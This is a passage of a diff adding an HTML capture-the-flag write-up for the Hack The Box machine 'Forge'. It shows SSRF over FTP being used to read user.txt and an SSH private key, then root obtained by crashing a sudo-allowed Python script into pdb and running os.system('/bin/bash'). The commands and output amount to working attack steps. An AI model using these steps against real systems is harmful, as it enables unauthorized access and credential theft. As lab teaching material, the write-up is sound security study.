+    <span class="k">except</span><span class="p">:</span>
+        <span class="c1"># We couldn&#39;t parse it as HTML, so return the text directly</span>
+        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+    <span class="c1"># We got a second link in the returned page, so fetch it and return</span>
+    <span class="c1"># the content.</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</code></pre></div>
+<p>After modifying the script, we can see whether the <code>/upload</code> function on the 
+<code>admin</code> site has any additional functionality. Attempting a <code>file:///</code> URL 
+shows that in addition to <code>HTTP</code> and <code>HTTPS</code>, we can now access <code>FTP</code> and
+<code>FTPS</code> URLs as well:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python ssrf.py
+<span class="go">url&gt; file:///etc/passwd</span>
+<span class="go">Invalid protocol! Supported protocols: http, https, ftp, ftps.</span>
+
+<span class="go">url&gt;</span>
+</code></pre></div>
+<p>We can access the internal <code>FTP</code> server using the credentials provided and grab
+<code>user.txt</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="go">url&gt; ftp://user:heightofsecurity123!@FORGE.HTB/</span>
+<span class="go">drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap</span>
+<span class="go">-rw-r-----    1 0        1000           33 Jan 22 20:07 user.txt</span>
+
+<span class="go">url&gt; ftp://user:heightofsecurity123!@FORGE.HTB/user.txt</span>
+<span class="go">737124c79df00af1e2bec4...</span>
+
+<span class="go">url&gt; </span>
+</code></pre></div>
+<p>The <code>snap</code> directory is an indication that we have accessed the home 
+directory of the <code>user</code> account. Since we know we can't use password
+authentication with <code>SSH</code>, we can look for a <code>.ssh</code> directory, which may
+contain a private key:</p>
+<div class="highlight"><pre><span></span><code><span class="go">url&gt; ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/</span>
+<span class="go">-rw-------    1 1000     1000          564 May 31  2021 authorized_keys</span>
+<span class="go">-rw-------    1 1000     1000         2590 May 20  2021 id_rsa</span>
+<span class="go">-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub</span>
+
+<span class="go">url&gt; ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa</span>
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="go">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="go">NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3</span>
+<span class="go">rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE</span>
+<span class="go">...</span>
+
+<span class="go">url&gt;</span>
+</code></pre></div>
+<p>Saving the private key allows us to <code>SSH</code> in as <code>user</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>ssh -i user-id_rsa user@forge.htb
+<span class="go">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)</span>
+
+<span class="go">...</span>
+
+<span class="go">Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6</span>
+<span class="gp">user@forge:~$</span>
+</code></pre></div>
+<h2 id="root">Root<a class="headerlink" href="#root" title="Permanent link">#</a></h2>
+<p>Running <code>sudo -l</code> shows us our path to <code>root</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">user@forge:~$ </span>sudo -l
+<span class="go">Matching Defaults entries for user on forge:</span>
+<span class="go">    env_reset, mail_badpass,</span>
+<span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+
+<span class="go">User user may run the following commands on forge:</span>
+<span class="go">    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py</span>
+<span class="gp">user@forge:~$ </span>
+</code></pre></div>
+<p>The Python script is straightforward:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">pdb</span>
+
+<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+    <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the secret passsword: &#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s1">&#39;secretadminpassword&#39;</span><span class="p">:</span>
+        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Wrong password!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome admin!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">What do you wanna do: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[1] View processes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] View free memory</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[3] View listening sockets</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[4] Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ps aux&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;df&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ss -lnt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Bye</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="k">break</span>
+<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="n">pdb</span><span class="o">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">__traceback__</span><span class="p">)</span>
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">quit</span><span class="p">()</span>
+</code></pre></div>
+<p>The script picks a random high port and listens it for an incoming connection. If
+the user enters the password <code>secretadminpassword</code>, a menu is presented to run
+various utilities: <code>ps</code>, <code>df</code>, and <code>ss</code>. The main body of the script is wrapped in
+a <code>try/except</code> block to catch any exceptions, calling the Python debugger <code>pdb</code>
+if one occurs. If we can cause an exception, we'll gain access to <code>pdb</code> running as
+root. The easiest location to do this would be in this call here:</p>
+<div class="highlight"><pre><span></span><code><span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</code></pre></div>
+<p>Entering a non-integer will raise a <code>ValueError</code> exception and dump us into the
+debugger. By running the script in one shell session, connecting to it in a
+second, and entering a string into the prompt, we see the <code>pdb</code> debugger in 
+the first session:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">user@forge:~$ </span>nc localhost <span class="m">43320</span>
+<span class="go">Enter the secret passsword: secretadminpassword</span>
+<span class="go">Welcome admin!</span>
+
+<span class="go">What do you wanna do:</span>
+<span class="go">[1] View processes</span>
+<span class="go">[2] View free memory</span>
+<span class="go">[3] View listening sockets</span>
+<span class="go">[4] Quit</span>
+<span class="go">pugpug</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="gp">user@forge:~$ </span>sudo /usr/bin/python3 /opt/remote-manage.py
+<span class="go">Listening on localhost:43320</span>
+<span class="go">invalid literal for int() with base 10: b&#39;pugpug&#39;</span>
+<span class="go">&gt; /opt/remote-manage.py(27)&lt;module&gt;()</span>
+<span class="go">-&gt; option = int(clientsock.recv(1024).strip())</span>
+<span class="gp gp-VirtualEnv">(Pdb)</span>
+</code></pre></div>
+<p>The second shell hangs while <code>pdb</code> is running, but we can easily now spawn a 
+shell as root from <code>pdb</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp gp-VirtualEnv">(Pdb)</span> <span class="go">import os</span>
+<span class="gp gp-VirtualEnv">(Pdb)</span> <span class="go">os.system(&#39;/bin/bash&#39;)</span>
+<span class="gp">root@forge:/home/user# </span>cat /root/root.txt
+<span class="go">8b4a2fb64e2fa7602574...</span>
+<span class="gp">root@forge:/home/user#</span>
+</code></pre></div>
+<h2 id="final-thoughts">Final thoughts<a class="headerlink" href="#final-thoughts" title="Permanent link">#</a></h2>
+<p>I enjoyed this box. The path to root was straightforward and felt like a realistic
+scenario that I might encounter in the real world. </p>
+<p><em>-- pugpug</em></p>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../Academy/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Academy" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Academy
+            </div>
+          </div>
+        </a>
+      
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Joe Ammond - <a href="https://twitter.com/joeammond">@joeammond</a>
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/joeammond" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.361d90f1.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.289a2a4b.min.js"></script>
+      
+    
+  </body>
+</html>
